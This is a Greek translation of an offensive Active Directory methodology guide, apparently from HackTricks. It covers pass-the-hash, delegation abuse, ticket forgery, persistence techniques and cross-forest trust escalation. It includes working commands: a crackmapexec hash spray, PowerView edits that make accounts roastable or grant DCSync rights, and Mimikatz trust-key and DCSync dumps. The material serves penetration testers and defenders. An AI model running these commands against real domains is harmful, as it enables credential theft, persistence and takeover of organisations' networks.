Χρειάζεται να χρησιμοποιήσετε κάποιο **εργαλείο** που θα **πραγματοποιήσει** την **NTLM authentication χρησιμοποιώντας** αυτό το **hash**, **ή** να δημιουργήσετε ένα νέο **sessionlogon** και να **injecτάρετε** αυτό το **hash** μέσα στο **LSASS**, ώστε όταν γίνει οποιαδήποτε **NTLM authentication**, να χρησιμοποιηθεί εκείνο το **hash.** Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.\
[**Διαβάστε αυτή τη σελίδα για περισσότερες πληροφορίες.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η επίθεση στοχεύει στο να **χρησιμοποιήσει το NTLM hash του χρήστη για να ζητήσει Kerberos tickets**, ως εναλλακτική στο συνηθισμένο Pass The Hash μέσω NTLM πρωτοκόλλου. Επομένως, αυτό μπορεί να είναι ιδιαίτερα **χρήσιμο σε δίκτυα όπου το NTLM πρωτόκολλο είναι απενεργοποιημένο** και επιτρέπεται μόνο **Kerberos** ως πρωτόκολλο αυθεντικοποίησης.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στην μέθοδο επίθεσης **Pass The Ticket (PTT)**, οι επιτιθέμενοι **κλέβουν το authentication ticket ενός χρήστη** αντί για τον κωδικό ή το hash του. Το κλεμμένο αυτό ticket χρησιμοποιείται για να **προσποιηθούν τον χρήστη**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε πόρους και υπηρεσίες μέσα σε ένα δίκτυο.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Αν έχετε το **hash** ή το **password** ενός **local administrator** πρέπει να προσπαθήσετε να **συνδεθείτε τοπικά** σε άλλους **PCs** με αυτά.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **θορυβώδες** και το **LAPS** θα το **μετριάσει**.

### MSSQL Abuse & Trusted Links

Αν ένας χρήστης έχει προνόμια για **access MSSQL instances**, θα μπορούσε να τα χρησιμοποιήσει για να **εκτελέσει εντολές** στον MSSQL host (αν τρέχει ως SA), να **κλέψει** το NetNTLM **hash** ή ακόμη και να πραγματοποιήσει μια **relay** **attack**.\
Επίσης, αν μια MSSQL instance είναι trusted (database link) από διαφορετική MSSQL instance, αν ο χρήστης έχει προνόμια πάνω στη trusted βάση δεδομένων, θα μπορεί να **χρησιμοποιήσει τη σχέση trust για να εκτελέσει queries και στην άλλη instance**. Αυτές οι trusts μπορούν να αλυσιδωθούν και σε κάποιο σημείο ο χρήστης μπορεί να βρει μια λάθος διαμορφωμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.\
**Οι συνδέσεις μεταξύ βάσεων δεδομένων λειτουργούν ακόμα και διαμέσου forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Πακέτα τρίτων για inventory και deployment συχνά αποκαλύπτουν ισχυρά μονοπάτια προς credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν βρείτε κάποιο Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε domain προνόμια στον υπολογιστή, θα μπορείτε να dumpάρετε TGTs από τη μνήμη όλων των χρηστών που συνδέονται στον υπολογιστή.\
Έτσι, αν ένας **Domain Admin συνδεθεί στον υπολογιστή**, θα μπορείτε να dumpάρετε το TGT του και να τον impersonate χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Ευχαριστώντας το constrained delegation θα μπορούσατε ακόμη και να **αυτοματοποιήσετε την παραβίαση ενός Print Server** (ελπίζοντας ότι θα είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας χρήστης ή υπολογιστής έχει δικαίωμα για "Constrained Delegation" θα μπορεί να **impersonate οποιονδήποτε χρήστη για να έχει πρόσβαση σε κάποιες υπηρεσίες σε έναν υπολογιστή**.\
Έπειτα, αν **compromise το hash** αυτού του χρήστη/υπολογιστή θα μπορείτε να **impersonate οποιονδήποτε χρήστη** (ακόμη και domain admins) για να αποκτήσετε πρόσβαση σε ορισμένες υπηρεσίες.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Η κατοχή του προνομίου **WRITE** σε ένα Active Directory αντικείμενο ενός απομακρυσμένου υπολογιστή επιτρέπει την επίτευξη code execution με **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ο συμβιβασμένος χρήστης μπορεί να έχει μερικά **ενδιαφέροντα προνόμια πάνω σε αντικείμενα του domain** που θα μπορούσαν να σας επιτρέψουν να **μετακινηθείτε lateral/να ανεβάσετε privileges**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Ο εντοπισμός μιας **Spool service που ακούει** μέσα στο domain μπορεί να **καταχραστεί** για να **αποκτήσετε νέα credentials** και να **ανεβάσετε προνόμια**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Αν **άλλοι χρήστες** **προσπελάζουν** τη **συμβιβασμένη** μηχανή, είναι πιθανό να **συλλέξετε credentials από τη μνήμη** και ακόμη να **εγχχύσετε beacons στις διεργασίες τους** για να τους impersonate.\
Συνήθως οι χρήστες θα προσπελάσουν το σύστημα μέσω RDP, οπότε εδώ έχετε πώς να πραγματοποιήσετε μερικές επιθέσεις πάνω σε τρίτες RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα για τη διαχείριση του **local Administrator password** σε domain-joined υπολογιστές, διασφαλίζοντας ότι είναι **τυχαίο**, μοναδικό και συχνά **αλλαγμένο**. Αυτά τα passwords αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs μόνο σε εξουσιοδοτημένους χρήστες. Με επαρκή permissions για πρόσβαση σε αυτά τα passwords, γίνεται δυνατή η pivot σε άλλους υπολογιστές.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Η **συλλογή certificates** από τη συμβιβασμένη μηχανή μπορεί να είναι ένας τρόπος για να ανεβάσετε προνόμια μέσα στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Αν έχουν ρυθμιστεί **ευάλωτα templates** είναι δυνατό να τα καταχραστείτε για να ανεβάσετε προνόμια:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Μόλις αποκτήσετε **Domain Admin** ή, ακόμα καλύτερα, **Enterprise Admin** προνόμια, μπορείτε να **dumpάρετε** τη **βάση δεδομένων του domain**: _ntds.dit_.

[**Περισσότερες πληροφορίες για την επίθεση DCSync εδώ**](dcsync.md).

[**Περισσότερες πληροφορίες για το πώς να κλέψετε το NTDS.dit εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Μερικές από τις τεχνικές που συζητήθηκαν προηγουμένως μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα μπορείτε να:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Η **Silver Ticket attack** δημιουργεί ένα **έγκυρο Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη υπηρεσία χρησιμοποιώντας το **NTLM hash** (π.χ. το **hash του PC account**). Αυτή η μέθοδος χρησιμοποιείται για να **αποκτήσει κανείς πρόσβαση στα προνόμια της υπηρεσίας**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Η **Golden Ticket attack** περιλαμβάνει έναν επιτιθέμενο που αποκτά πρόσβαση στο **NTLM hash του λογαριασμού krbtgt** σε ένα Active Directory περιβάλλον. Αυτός ο λογαριασμός είναι ειδικός επειδή χρησιμοποιείται για την υπογραφή όλων των **Ticket Granting Tickets (TGTs)**, που είναι απαραίτητα για την authentication μέσα στο AD δίκτυο.

Μόλις ο επιτιθέμενος αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιθυμεί (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά είναι σαν golden tickets αλλά πλαστογραφημένα με τρόπο που **παρακάμπτει κοινούς μηχανισμούς ανίχνευσης golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Η κατοχή certificates ενός λογαριασμού ή η δυνατότητα να τα αιτηθείτε** είναι ένας πολύ καλός τρόπος για να διατηρήσετε persistence στον λογαριασμό του χρήστη (ακόμη και αν αλλάξει το password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Η χρήση certificates είναι επίσης δυνατόν να παρέχει persistence με υψηλά προνόμια μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το αντικείμενο **AdminSDHolder** στο Active Directory εξασφαλίζει την ασφάλεια των **privileged groups** (όπως οι Domain Admins και Enterprise Admins) εφαρμόζοντας ένα πρότυπο **Access Control List (ACL)** σε αυτές τις ομάδες για να αποτρέψει μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να εκμεταλλευτεί· αν ένας επιτιθέμενος τροποποιήσει το ACL του AdminSDHolder για να δώσει πλήρη πρόσβαση σε έναν απλό χρήστη, αυτός ο χρήστης αποκτά εκτεταμένο έλεγχο πάνω σε όλες τις privileged groups. Αυτή η ρύθμιση ασφαλείας, που προορίζεται για προστασία, μπορεί να γυρίσει μπούμερανγκ, επιτρέποντας αδικαιολόγητη πρόσβαση εκτός αν παρακολουθείται στενά.

[**Περισσότερες πληροφορίες για το AdminDSHolder Group εδώ.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Σε κάθε **Domain Controller (DC)** υπάρχει ένας **τοπικός administrator** λογαριασμός. Με την απόκτηση admin δικαιωμάτων σε μια τέτοια μηχανή, το local Administrator hash μπορεί να εξαχθεί χρησιμοποιώντας **mimikatz**. Στη συνέχεια απαιτείται μια τροποποίηση στο registry για να **επιτραπεί η χρήση αυτού του password**, επιτρέποντας απομακρυσμένη πρόσβαση στον τοπικό Administrator λογαριασμό.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Μπορείτε να **δώσετε** μερικά **ειδικά δικαιώματα** σε έναν **χρήστη** πάνω σε ορισμένα domain αντικείμενα που θα επιτρέψουν στον χρήστη να **ανεβάσει προνόμια στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Οι **security descriptors** χρησιμοποιούνται για να **αποθηκεύσουν** τα **δικαιώματα** που έχει ένα **αντικείμενο** επάνω σε ένα **αντικείμενο**. Αν μπορείτε απλά να **κάνετε** μια **μικρή αλλαγή** στο **security descriptor** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα προνόμια πάνω σε αυτό το αντικείμενο χωρίς να χρειάζεται να είστε μέλος μιας privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Καταχραστείτε την auxiliary class `dynamicObject` για να δημιουργήσετε βραχυχρόνιους principals/GPOs/DNS records με `entryTTL`/`msDS-Entry-Time-To-Die`; αυτοαπο-διαγράφονται χωρίς tombstones, σβήνοντας τεκμήρια LDAP ενώ αφήνουν orphan SIDs, σπασμένες αναφορές `gPLink`, ή cached DNS responses (π.χ., AdminSDHolder ACE pollution ή κακόβουλα `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποιήστε τη **LSASS** στη μνήμη για να καθιερώσετε ένα **universal password**, προσδίδοντας πρόσβαση σε όλους τους λογαριασμούς του domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε τον **δικό σας SSP** για να **capturάρετε** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στη μηχανή.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Εγγράφει έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **pushάρει attributes** (SIDHistory, SPNs...) σε συγκεκριμένα αντικείμενα **χωρίς** να αφήνει **logs** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε DA προνόμια και να είστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να ανεβάσετε προνόμια αν έχετε **αρκετή άδεια για να διαβάσετε LAPS passwords**. Ωστόσο, αυτά τα passwords μπορούν επίσης να χρησιμοποιηθούν για **διατήρηση persistence**.\
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το όριο ασφάλειας. Αυτό σημαίνει ότι **ο συμβιβασμός ενός μεμονωμένου domain θα μπορούσε δυνητικά να οδηγήσει στον συμβιβασμό ολόκληρου του Forest**.

### Basic Information

Μια [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφάλειας που επιτρέπει σε έναν χρήστη από ένα **domain** να έχει πρόσβαση σε resources σε ένα άλλο **domain**. Ουσιαστικά δημιουργεί έναν δεσμό μεταξύ των authentication συστημάτων των δύο domains, επιτρέποντας στις επαληθεύσεις authentication να ρέουν άνετα. Όταν τα domains ρυθμίζουν μια trust, ανταλλάσσουν και κρατούν συγκεκριμένα **keys** μέσα στους **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα της trust.

Σε ένα τυπικό σενάριο, αν ένας χρήστης θέλει να έχει πρόσβαση σε μια υπηρεσία σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket γνωστό ως **inter-realm TGT** από τον δικό του DC. Αυτό το TGT κρυπτογραφείται με ένα κοινό **key** που έχουν συμφωνήσει και τα δύο domains. Ο χρήστης στη συνέχεια παρουσιάζει αυτό το inter-realm TGT στον **DC του trusted domain** για να πάρει ένα service ticket (**TGS**). Μετά την επιτυχή επικύρωση του inter-realm TGT από τον DC του trusted domain, αυτός εκδίδει ένα TGS, παραχωρώντας στον χρήστη πρόσβαση στην υπηρεσία.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

Είναι σημαντικό να σημειωθεί ότι **μια trust μπορεί να είναι 1-way ή 2-way**. Στην επιλογή των 2 ways, και τα δύο domains θα εμπιστεύονται το ένα το άλλο, αλλά στη **1 way** σχέση trust, ένα από τα domains θα είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείτε να έχετε πρόσβαση μόνο σε resources μέσα στο trusting domain από το trusted**.

Αν το Domain A trusts το Domain B, το A είναι το trusting domain και το B είναι το trusted. Επιπλέον, στο **Domain A**, αυτό θα είναι ένα **Outbound trust**· και στο **Domain B**, αυτό θα είναι ένα **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Αυτό είναι μια συνηθισμένη ρύθμιση μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα μια two-way transitive trust με το parent domain. Ουσιαστικά αυτό σημαίνει ότι οι αιτήσεις authentication μπορούν να ρέουν άνετα μεταξύ parent και child.
- **Cross-link Trusts**: Αναφέρονται ως "shortcut trusts," και δημιουργούνται μεταξύ child domains για να επιταχύνουν τις διαδικασίες referral. Σε πολύπλοκα forests, οι authentication referrals συνήθως πρέπει να ανέβουν μέχρι το forest root και μετά να κατέβουν στο target domain. Με τη δημιουργία cross-links, το ταξίδι συντομεύει, κάτι που είναι ιδιαίτερα χρήσιμο σε γεωγραφικά διασκορπισμένα περιβάλλοντα.
- **External Trusts**: Αυτές ρυθμίζονται μεταξύ διαφορετικών, μη σχετιζόμενων domains και είναι μη-transitive από τη φύση τους. Σύμφωνα με [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), οι external trusts είναι χρήσιμες για την πρόσβαση σε resources σε ένα domain έξω από το τρέχον forest που δεν συνδέεται με forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτές οι trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός νεοπροστιθέμενου tree root. Αν και δεν συναντώνται συχνά, οι tree-root trusts είναι σημαντικές για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντας τους να διατηρούν ένα μοναδικό domain name και εξασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες μπορείτε να βρείτε στον [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι μια two-way transitive trust μεταξύ δύο forest root domains, επίσης επιβάλλοντας SID filtering για την ενίσχυση των μέτρων ασφαλείας.
- **MIT Trusts**: Αυτές οι trusts δημιουργούνται με μη-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Οι MIT trusts είναι λίγο πιο εξειδικευμένες και στοχεύουν περιβάλλοντα που απαιτούν ενσωμάτωση με Kerberos-based συστήματα έξω από το Windows οικοσύστημα.

#### Other differences in **trusting relationships**

- Μια trust relationship μπορεί επίσης να είναι **transitive** (A trusts B, B trusts C, τότε A trusts C) ή **non-transitive**.
- Μια trust relationship μπορεί να ρυθμιστεί ως **bidirectional trust** (και οι δύο εμπιστεύονται ο ένας τον άλλο) ή ως **one-way trust** (μόνο ένας εμπιστεύεται τον άλλον).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για την απαρίθμηση των σχέσεων εμπιστοσύνης του domain:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 trusted keys**, ένα για _Child --> Parent_ και ένα άλλο για _Parent_ --> _Child_.\
> Μπορείτε να δείτε ποιο χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Αναβαθμίστε σε Enterprise admin στο child/parent domain εκμεταλλευόμενοι το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Η κατανόηση του τρόπου με τον οποίο το Configuration Naming Context (NC) μπορεί να εκμεταλλευτεί είναι κρίσιμη. Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο για δεδομένα διαμόρφωσης σε ένα forest σε Active Directory (AD) περιβάλλοντα. Αυτά τα δεδομένα αντιγράφονται σε κάθε Domain Controller (DC) εντός του forest, με writable DCs να διατηρούν ένα εγγράψιμο αντίγραφο του Configuration NC. Για να το εκμεταλλευτείτε, πρέπει να έχετε **SYSTEM privileges on a DC**, προτιμότερα σε έναν child DC.

**Link GPO to root DC site**

Το Sites container του Configuration NC περιλαμβάνει πληροφορίες για τα sites όλων των domain-joined υπολογιστών εντός του AD forest. Λειτουργώντας με SYSTEM privileges σε οποιονδήποτε DC, οι επιτιθέμενοι μπορούν να συνδέσουν GPOs στα root DC sites. Αυτή η ενέργεια ενδέχεται να θέσει σε κίνδυνο το root domain μέσω της χειραγώγησης των policies που εφαρμόζονται σε αυτά τα sites.

Για λεπτομερείς πληροφορίες, μπορείτε να εξετάσετε την έρευνα σχετικά με [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Μια επίθεση μπορεί να στοχεύει privileged gMSAs εντός του domain. Το KDS Root key, απαραίτητο για τον υπολογισμό των passwords των gMSAs, αποθηκεύεται μέσα στο Configuration NC. Με SYSTEM privileges σε οποιονδήποτε DC, είναι δυνατό να αποκτήσει κανείς πρόσβαση στο KDS Root key και να υπολογίσει τα passwords για οποιοδήποτε gMSA σε όλο το forest.

Λεπτομερής ανάλυση και οδηγίες βήμα-βήμα μπορείτε να βρείτε σε:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Συμπληρωματική delegated MSA επίθεση (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Επιπρόσθετη εξωτερική έρευνα: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Αυτή η μέθοδος απαιτεί υπομονή, αναμένοντας τη δημιουργία νέων privileged AD objects. Με SYSTEM privileges, ένας επιτιθέμενος μπορεί να τροποποιήσει το AD Schema για να δώσει σε οποιονδήποτε χρήστη πλήρη έλεγχο πάνω σε όλες τις classes. Αυτό μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο επί νεοδημιουργούμενων AD objects.

Περισσότερη ανάγνωση διατίθεται στο [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει στον έλεγχο αντικειμένων Public Key Infrastructure (PKI) για τη δημιουργία ενός certificate template που επιτρέπει authentication ως οποιοσδήποτε χρήστης εντός του forest. Δεδομένου ότι τα PKI objects βρίσκονται στο Configuration NC, ο συμβιβασμός ενός writable child DC επιτρέπει την εκτέλεση ESC5 attacks.

Περισσότερες λεπτομέρειες μπορούν να διαβαστούν στο [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Σε σενάρια χωρίς ADCS, ο επιτιθέμενος έχει τη δυνατότητα να στήσει τα απαραίτητα components, όπως συζητείται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Σε αυτό το σενάριο **το domain σας είναι εμπιστευμένο** από ένα εξωτερικό, δίνοντάς σας **απροσδιόριστα δικαιώματα** πάνω σε αυτό. Θα χρειαστεί να βρείτε **ποιοι security principals του domain σας έχουν ποια πρόσβαση στο εξωτερικό domain** και στη συνέχεια να προσπαθήσετε να τα εκμεταλλευτείτε:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Εξωτερικό Forest Domain - Μονόδρομη (Εξερχόμενη)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο **your domain** εμπιστεύεται κάποια **privileges** σε principal από **different domains**.

Ωστόσο, όταν ένα **domain is trusted** από το trusting domain, το trusted domain **creates a user** με ένα **predictable name** που χρησιμοποιεί ως **password the trusted password**. Αυτό σημαίνει ότι είναι δυνατόν να **access a user from the trusting domain to get inside the trusted one** για να το εξερευνήσει και να προσπαθήσει να κλιμακώσει περισσότερα privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος να υποκλέψετε το trusted domain είναι να βρείτε μια [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί στην **opposite direction** της domain trust (κάτι που δεν είναι πολύ συχνό).

Ένας ακόμα τρόπος να υποκλέψετε το trusted domain είναι να περιμένετε σε μια μηχανή στην οποία ένας **user from the trusted domain can access** για να κάνει login μέσω **RDP**. Έπειτα, ο attacker θα μπορούσε να εγχύσει κώδικα στη διαδικασία συνεδρίας RDP και να **access the origin domain of the victim** από εκεί.\
Επιπλέον, αν ο **victim mounted his hard drive**, από τη διαδικασία **RDP session** ο attacker θα μπορούσε να αποθηκεύσει **backdoors** στο **startup folder of the hard drive**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που εκμεταλλεύονται το SID history attribute σε forest trusts μειώνεται από το SID Filtering, το οποίο είναι ενεργοποιημένο από προεπιλογή σε όλους τους inter-forest trusts. Αυτό βασίζεται στην υπόθεση ότι οι intra-forest trusts είναι ασφαλείς, θεωρώντας το forest, παρά το domain, ως το όριο ασφαλείας σύμφωνα με τη θέση της Microsoft.
- Ωστόσο, υπάρχει ένα πρόβλημα: το SID filtering μπορεί να διαταράξει εφαρμογές και πρόσβαση χρηστών, οδηγώντας στην περιστασιακή απενεργοποίησή του.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση του Selective Authentication διασφαλίζει ότι οι χρήστες από τα δύο forests δεν αυθεντικοποιούνται αυτόματα. Αντίθετα, απαιτούνται ρητές άδειες για να έχουν οι χρήστες πρόσβαση σε domains και servers εντός του trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του writable Configuration Naming Context (NC) ή επιθέσεις στον trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

